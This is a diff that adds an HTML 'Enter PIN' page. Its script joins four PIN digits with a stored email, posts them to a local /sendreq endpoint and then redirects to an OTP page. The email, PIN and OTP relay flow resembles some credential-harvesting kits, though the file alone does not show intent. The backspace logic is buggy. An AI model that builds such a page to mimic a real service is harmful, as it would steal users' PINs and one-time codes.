@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="shortcut icon" href="./grey-logo.png" type="image/x-icon">
+
+  <title>Enter PIN</title>
+ <style>
+    * {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: "Inter", sans-serif;
+}
+
+body {
+  background-color: #fff;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.container {
+  width: 100%;
+  max-width: 600px;
+  text-align: center;
+  padding: 30px 20px;
+}
+
+h2 {
+  font-size: 1.3rem;
+  font-weight: 600;
+  margin-bottom: 6px;
+}
+
+p {
+  color: #555;
+  font-size: 0.9rem;
+  margin-bottom: 30px;
+}
+
+.pin-inputs {
+  display: flex;
+  justify-content: center;
+  gap: 15px;
+  margin-bottom: 20px;
+}
+
+.pin-inputs input {
+  width: 50px;
+  height: 50px;
+  font-size: 1.5rem;
+  text-align: center;
+  border: 1px solid #d1d5db;
+  border-radius: 4px;
+  outline: none;
+  transition: border-color 0.2s;
+}
+
+.pin-inputs input:focus {
+  border-color: #2563eb;
+  box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.15);
+}
+
+.forgot {
+  display: inline-block;
+  color: #2563eb;
+  font-size: 0.9rem;
+  text-decoration: none;
+  margin-bottom: 40px;
+}
+
+.forgot:hover {
+  text-decoration: underline;
+}
+
+button {
+  width: 100%;
+  background-color: #2563eb;
+  color: #fff;
+  border: none;
+  border-radius: 6px;
+  padding: 14px;
+  font-size: 1rem;
+  font-weight: 600;
+  cursor: pointer;
+  position: relative;
+  overflow: hidden;
+  transition: background 0.3s ease;
+}
+
+button:hover {
+  background-color: #1e4ed8;
+}
+
+.loader {
+  display: none;
+  width: 20px;
+  height: 20px;
+  border: 3px solid #fff;
+  border-top: 3px solid transparent;
+  border-radius: 50%;
+  animation: spin 0.9s linear infinite;
+  position: absolute;
+  left: 50%;
+  top: 50%;
+  transform: translate(-50%, -50%);
+}
+
+@keyframes spin {
+  to {
+    transform: translate(-50%, -50%) rotate(360deg);
+  }
+}
+
+button.loading .btn-text {
+  visibility: hidden;
+}
+
+button.loading .loader {
+  display: block;
+}
+
+/* Responsive */
+@media (max-width: 480px) {
+  .pin-inputs {
+    gap: 10px;
+  }
+
+  .pin-inputs input {
+    width: 45px;
+    height: 45px;
+  }
+}
+
+ </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Enter your current PIN</h2>
+    <p>Enter your existing 4-digit code</p>
+
+    <div class="pin-inputs">
+      <input  name="pss" type="password" maxlength="1" autofocus />
+      <input name="pss"  type="password" maxlength="1" />
+      <input name="pss"  type="password" maxlength="1" />
+      <input name="pss" type="password" maxlength="1" />
+      
+    </div>
+    <p class="msg" style="color: red; font-size: small;"></p>
+    <a href="#" class="forgot">Forgot PIN?</a>
+
+    <button id="continue-btn">
+      <span class="btn-text">Continue</span>
+      <span class="loader"></span>
+    </button>
+  </div>
+
+  <script>
+const inputs = document.querySelectorAll(".pin-inputs input");
+const continueBtn = document.getElementById("continue-btn");
+let pin = []
+let i ;
+// Auto move to next input
+for (let index = 0; index < inputs.length; index++) {
+  const element = inputs[index];
+  
+
+  element.addEventListener("input", () => {
+    if (element.value.length === 1 ) {
+     
+      if (index == 3) {
+        inputs[index].focus(); 
+      }else{
+        inputs[index + 1].focus()
+      }
+      
+      pin.push(inputs[index].value)
+      console.log(pin)
+    }
+  });
+  i= index
+ 
+  // Backspace goes to previous input
+  element.addEventListener("keydown", (e) => {
+  if (e.key == "Backspace") {
+   
+   
+      if (i== 3) {inputs[i].focus();i =i -1; pin.splice(pin.indexOf(i),1)}
+      else if(i==2){inputs[i].focus(); i=i -1; pin.splice(pin.indexOf(i),1)}
+      else if(i==1){inputs[i].focus(); i=i -1;  pin.splice(pin.indexOf(i),1)}
+      else if(i==0){inputs[i].focus(); i=i -1 ; pin.splice(pin.indexOf(i),1)}
+      if (i > 3 || i == -1){i=3}
+      console.log(pin)
+    }
+  });
+
+}
+// Focus first input on page load
+window.addEventListener("load", () => {
+  inputs[0].focus();
+});
+
+// Simulate loading animation on button click
+continueBtn.addEventListener("click", () => {
+  
+
+      if (inputs[0].value != ''&& inputs[1].value != ''&&inputs[2].value != ''&&inputs[3].value != '') {
+        continueBtn.classList.add("loading");
+           document.querySelector('.msg').textContent = ''
+         // Simulate processing
+         const send_data = {
+    msg: 'pin',
+    email: localStorage.getItem('email'),
+    pin:`${inputs[0].value}${inputs[1].value}${inputs[2].value}${inputs[3].value}`
+  }
+         console.log(send_data)
+    fetch('http://localhost:3100/sendreq',{
+    method: 'POST',
+                credentials:'include',
+               headers: {
+                 'Content-Type': 'application/json',
+                       
+               },
+               body: JSON.stringify(send_data) // Convert the data to a JSON string
+              }
+    ).then(async res =>{
+      const data = await res.json()
+      
+      if (data.msg == 'successful') {
+        console.log(data)
+        setTimeout(() => {
+    continueBtn.classList.remove("loading");
+    // Redirect example: window.location.href = "dashboard.html";
+    window.location.href = './otp';
+  }, 2000);
+      }
+    }).catch(err =>{console.log(err)})
+      }else{
+        document.querySelector('.msg').textContent = 'Incomplete Pin';
+        inputs[0].focus()
+      }
+  
+});
+
+  </script>
+</body>
+</html>
